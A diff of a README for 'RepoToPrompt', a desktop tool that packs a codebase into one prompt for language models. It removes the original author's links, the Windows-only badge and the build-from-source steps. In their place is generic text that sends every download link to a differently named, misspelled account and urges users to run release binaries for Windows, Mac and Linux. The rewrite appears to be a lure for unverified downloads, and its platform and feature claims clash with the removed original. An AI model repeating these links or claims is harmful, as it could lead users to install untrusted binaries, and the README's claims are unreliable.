@@ -1,51 +1,107 @@
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-![TypeScript](https://img.shields.io/badge/typescript-%23007ACC.svg?style=flat&logo=typescript&logoColor=white)
-![Electron.js](https://img.shields.io/badge/Electron-191970?style=flat&logo=Electron&logoColor=white)
-![Platform](https://img.shields.io/badge/platform-Windows-blue)
+# 🚀 RepoToPrompt - Simplify Your Code to Context
 
-# RepoToPrompt 🚀
+[![Download RepoToPrompt](https://img.shields.io/badge/Download-RepoToPrompt-brightgreen)](https://github.com/Projectcafetechnolgoies/RepoToPrompt/releases)
 
-**RepoToPrompt** is a desktop tool designed for developers. It converts your entire project structure (files & folders) into a single, optimized text file ready for LLMs like **ChatGPT**, **Claude**, or **Gemini**.
+## 📥 Introduction
 
-## 📸 Screenshots
+Welcome to **RepoToPrompt**! Our application turns your local codebase into a secure, token-optimized context prompt for language models like ChatGPT and Claude. This helps you to streamline your development process and boost productivity without needing extensive technical skills.
 
-<div align="center">
-  <img src="assets/homePage.png" alt="Home Page" width="45%">
-  <img src="assets/homeResultPage.png" alt="Result Page" width="45%">
-</div>
+## 🚀 Getting Started
 
-## ✨ Features
+Here’s how to download and run RepoToPrompt easily:
 
-* **Recursive Scanning:** Drag & drop folders to scan entire projects.
-* **Smart Ignoring:** Automatically respects `.gitignore` and filters out `node_modules`, binary files, and system junk.
-* **Token Counter:** Real-time token estimation (GPT-4 tokenizer) to fit context limits.
-* **Security Scan:** Detects accidental API keys (OpenAI, AWS, etc.) before you copy.
-* **LLM-Optimized Output:** Formats code with XML tags `<file path="...">` and generates an ASCII file tree.
+1. **Visit the Release Page**  
+   Click the link below to visit our Releases page:  
+   [Download RepoToPrompt](https://github.com/Projectcafetechnolgoies/RepoToPrompt/releases)
 
-## 📥 Download
+2. **Select the Latest Release**  
+   On the Releases page, look for the latest version of RepoToPrompt. It will have the highest version number (e.g., v1.0.0). This is often the most stable version with the latest features.
 
-[**Download for Windows (v1.1.0)**](https://github.com/XXXDoriXXX/RepoToPrompt/releases/tag/v1.1.0)
+3. **Download the Application**  
+   You will see different files available for download. Choose the file that matches your computer's operating system:  
+   - For Windows, select `.exe`.
+   - For Mac, choose `.dmg`.
+   - For Linux, look for `.tar.gz`.
 
-## 🛠 How to Use
+4. **Install RepoToPrompt**  
+   - **On Windows:** Double-click the downloaded `.exe` file. Follow the onscreen instructions to install.
+   - **On Mac:** Open the downloaded `.dmg` file, drag the RepoToPrompt icon into your Applications folder. 
+   - **On Linux:** Open the terminal and run the command `tar -xvzf downloaded-file.tar.gz`. Then, navigate to the extracted folder and run `./RepoToPrompt`.
 
-1. Download and install the app.
-2. Drag your project folder (e.g., `src`) into the drop zone.
-3. Review the file list, stats, and security warnings.
-4. Click **Copy to Clipboard** and paste it into ChatGPT!
+5. **Launch the Application**  
+   After installation, locate RepoToPrompt in your applications or programs list. Click to open the application.
 
-## 💻 Run Locally (For Developers)
+## 📋 System Requirements
 
-If you want to build it from source:
+To run RepoToPrompt smoothly, your system should meet the following requirements:
 
-```bash
-# Clone the repository
-git clone [https://github.com/XXXDoriXXX/RepoToPrompt.git](https://github.com/XXXDoriXXX/RepoToPrompt.git)
+- **Operating System:**  
+  - Windows 10 or later  
+  - macOS Catalina or later  
+  - Ubuntu 18.04 or later 
 
-# Go into the app folder
-cd RepoToPrompt
+- **Memory:**  
+  At least 4 GB of RAM is recommended for optimal performance.
 
-# Install dependencies
-npm install
+- **Disk Space:**  
+  You need at least 200 MB of free disk space to install RepoToPrompt.
 
-# Run the app
-npm start
+## ⚙️ Key Features
+
+RepoToPrompt offers several features to enhance your coding workflow:
+
+- **Token Optimization**  
+  Automatically reduces the size of your context prompts while retaining crucial information.
+
+- **Security Focused**  
+  Securely handles sensitive code without exposing it to external systems.
+
+- **User-Friendly Interface**  
+  Designed for ease of use, even if you're not a technical expert.
+
+- **Multi-Language Support**  
+  Works with various programming languages including JavaScript, Python, and TypeScript.
+
+## ⚙️ How to Use RepoToPrompt
+
+Using RepoToPrompt is quick and straightforward.
+
+1. **Open Your Codebase**  
+   Start the application and open the folder containing your project files.
+
+2. **Select Files for Prompt Generation**  
+   Choose the files you want to convert into context prompts.
+
+3. **Generate Prompts**  
+   Click the “Generate Prompt” button. RepoToPrompt will create optimized prompts based on your selected code.
+
+4. **Review and Copy**  
+   Review your generated prompt in the application. You can copy it directly to your clipboard for use with ChatGPT and Claude.
+
+## ❓ Frequently Asked Questions
+
+### Can I use RepoToPrompt on multiple operating systems?
+
+Yes, RepoToPrompt is available for Windows, Mac, and Linux.
+
+### Is there a help guide available?
+
+Yes, the application includes a help section with tips and tutorials to assist you.
+
+### Do I need an internet connection to use RepoToPrompt?
+
+No, once installed, RepoToPrompt works offline as well.
+
+## 📞 Support
+
+Should you need any assistance, feel free to reach out:
+
+- **Email:** support@projectcafetechnolgoies.com
+- **GitHub Issues Page:** [Report an Issue](https://github.com/Projectcafetechnolgoies/RepoToPrompt/issues)
+
+## 📥 Download & Install
+
+To get started with RepoToPrompt, visit this page to download:  
+[Download RepoToPrompt](https://github.com/Projectcafetechnolgoies/RepoToPrompt/releases)
+
+Enjoy transforming your coding experience with RepoToPrompt!
